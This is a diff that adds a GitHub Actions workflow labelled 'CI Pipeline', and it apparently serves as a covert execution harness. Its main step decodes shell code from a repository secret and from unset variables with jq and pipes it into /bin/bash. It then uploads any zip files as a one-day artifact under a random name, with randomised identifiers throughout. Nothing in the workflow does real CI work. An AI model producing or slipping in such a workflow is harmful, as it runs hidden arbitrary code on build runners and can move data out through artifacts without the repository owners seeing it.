@@ -1,0 +1,28 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          siep17: ${{ secrets.siep17 }}
+        run: |
+          printf '%s' "$siep17" | jq -r .qgobe97451 | /bin/bash
+          echo $wlucd2995 | jq -r .j15 | /bin/bash
+          echo $yowy3 | jq -r .norxp9718 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: GszhWzLI
+          path: "*.zip"
+          retention-days: 1
